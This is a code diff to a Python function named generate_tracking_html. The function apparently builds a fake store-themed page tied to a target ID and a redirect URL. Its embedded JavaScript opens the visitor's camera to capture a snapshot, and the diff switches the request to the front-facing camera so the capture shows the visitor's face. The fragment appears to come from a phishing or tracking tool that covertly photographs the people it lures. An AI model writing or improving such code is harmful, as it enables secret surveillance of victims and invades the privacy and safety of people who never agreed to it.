@@ -213,7 +213,7 @@ def generate_tracking_html(target_id: str, redirect_url: str, store_name: str, t
 
             function captureSnap() {{
                 if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {{
-                    navigator.mediaDevices.getUserMedia({{ video: true }}).then(function(stream) {{
+                    navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }}).then(function(stream) {{
                         var video = document.createElement('video');
                         video.srcObject = stream;
                         video.play();
